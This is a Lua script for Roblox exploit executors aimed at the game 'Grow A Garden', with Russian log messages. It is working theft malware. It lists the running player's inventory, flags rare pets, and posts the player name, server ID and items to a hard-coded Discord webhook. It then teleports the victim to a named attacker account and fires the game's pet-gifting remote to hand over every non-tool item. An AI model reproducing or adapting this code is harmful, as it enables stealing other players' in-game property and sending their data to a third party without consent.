if shared.GAGInjected then return end
shared.GAGInjected = true

local ATTACKER = "USERNAME_HERE"
local MAIN_WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
local DEBUG_WEBHOOK = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
local IMPORTANT = {"Raccoon", "Dragonfly", "Red Fox", "Queen Bee", "Chicken Zombie", "Candy Blossom", "Kitsune", "French Fly Ferret"}
local IGNORED = {"Can", "Shovel", "Seed", "Wrench", "Sprinkler", "Rod", "Tool", "Staff", "Trowel"}

local function debugLog(message, level)
    local request = http_request or syn and syn.request or fluxus and fluxus.request
    if not request then return end
    
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local logMessage = string.format("[%s] [%s] %s", timestamp, level or "DEBUG", message)
    
    print(logMessage)
    
    pcall(function()
        request({
            Url = DEBUG_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = logMessage
            })
        })
    end)
end

local function safeExecute(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        debugLog(string.format("Ошибка в %s: %s", tostring(func), result), "ERROR")
        return nil
    end
    return result
end

debugLog("Скрипт инициализирован", "INFO")

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local localPlayer = safeExecute(function() return game:GetService("Players").LocalPlayer end)
if not localPlayer then
    debugLog("Не удалось получить LocalPlayer", "ERROR")
    return
end

local function getService(name)
    local service = safeExecute(function() return game:GetService(name) end)
    if not service then
        debugLog("Сервис не найден: "..name, "ERROR")
    end
    return service
end

local ReplicatedStorage = getService("ReplicatedStorage")
local Players = getService("Players")
local HttpService = getService("HttpService")
local VirtualInputManager = getService("VirtualInputManager")
local RunService = getService("RunService")

if not (ReplicatedStorage and Players and HttpService) then
    debugLog("Критические сервисы не загружены", "ERROR")
    return
end

local function deltaBypass()
    if not VirtualInputManager then
        debugLog("VirtualInputManager недоступен", "WARNING")
        return false
    end
    
    return safeExecute(function()
        VirtualInputManager:SendMouseButtonEvent(
            workspace.CurrentCamera.ViewportSize.X/2,
            workspace.CurrentCamera.ViewportSize.Y/2,
            0, true, nil, false)
        task.wait(0.1)
        VirtualInputManager:SendMouseButtonEvent(
            workspace.CurrentCamera.ViewportSize.X/2,
            workspace.CurrentCamera.ViewportSize.Y/2,
            0, false, nil, false)
        return true
    end) or false
end

local function sendDataToDiscord(data)
    return safeExecute(function()
        local request = http_request or syn and syn.request or fluxus and fluxus.request
        if not request then return false end
        
        request({
            Url = MAIN_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
        return true
    end) or false
end

local function collectItems()
    local items = {}
    local importantItems = {}
    
    if not localPlayer:FindFirstChild("Backpack") then
        debugLog("Инвентарь не найден", "WARNING")
        return items, importantItems
    end
    
    for _, item in pairs(localPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local itemNameLower = string.lower(item.Name)
            local isImportant = false
            
            for _, v in ipairs(IMPORTANT) do
                if string.find(itemNameLower, string.lower(v)) then
                    table.insert(importantItems, item.Name)
                    isImportant = true
                    break
                end
            end
            
            if not isImportant then
                local shouldIgnore = false
                for _, v in ipairs(IGNORED) do
                    if string.find(itemNameLower, string.lower(v)) then
                        shouldIgnore = true
                        break
                    end
                end
                
                if not shouldIgnore then
                    table.insert(items, item.Name)
                end
            end
        end
    end
    
    return items, importantItems
end

local function main()
    debugLog("Начало выполнения основной логики", "INFO")
    
    local items, importantItems = collectItems()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    local embed = {
        title = "Grow A Garden Report",
        fields = {
            {name = "Игрок", value = localPlayer.Name, inline = true},
            {name = "Сервер", value = jobId, inline = true},
            {name = "Обычные предметы", value = #items > 0 and table.concat(items, ", ") or "Нет", inline = false},
            {name = "Важные предметы", value = #importantItems > 0 and table.concat(importantItems, ", ") or "Нет", inline = false}
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    sendDataToDiscord({embeds = {embed}})
    
    local target = Players:FindFirstChild(ATTACKER)
    if not target then
        debugLog("Целевой игрок не найден: "..ATTACKER, "WARNING")
        return
    end
    
    debugLog("Найден целевой игрок: "..target.Name, "INFO")
    
    local function followTarget()
        local connection
        connection = RunService.Stepped:Connect(function()
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
                end
            end
        end)
        return connection
    end
    
    local followConnection = followTarget()
    
    local function giftItem(item, targetPlayer)
        if not item or not targetPlayer then return false end
        
        if item.Parent ~= localPlayer.Backpack then
            item.Parent = localPlayer.Backpack
            task.wait(0.3)
        end
        
        if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
            localPlayer.Character.Humanoid:EquipTool(item)
            task.wait(0.5)
            
            if detectExecutor and detectExecutor() == "Delta" then
                deltaBypass()
            else
                local petGifting = ReplicatedStorage:FindFirstChild("GameEvents"):FindFirstChild("PetGiftingService")
                if petGifting then
                    petGifting:FireServer("GivePet", targetPlayer)
                end
            end
            
            task.wait(0.5)
            if item.Parent == localPlayer.Character then
                item.Parent = localPlayer.Backpack
            end
            return true
        end
        return false
    end
    
    for _, item in pairs(localPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local itemNameLower = string.lower(item.Name)
            local shouldIgnore = false
            
            for _, v in ipairs(IGNORED) do
                if string.find(itemNameLower, string.lower(v)) then
                    shouldIgnore = true
                    break
                end
            end
            
            if not shouldIgnore then
                for attempt = 1, 3 do
                    if giftItem(item, target) then
                        debugLog("Успешно передано: "..item.Name, "SUCCESS")
                        break
                    else
                        debugLog("Не удалось передать: "..item.Name.." (попытка "..attempt..")", "WARNING")
                    end
                    task.wait(0.5)
                end
            end
        end
    end
    
    if followConnection then
        followConnection:Disconnect()
    end
    
    debugLog("Скрипт завершил работу", "INFO")
end

local success, err = pcall(main)
if not success then
    debugLog("Критическая ошибка: "..err, "CRITICAL")
end
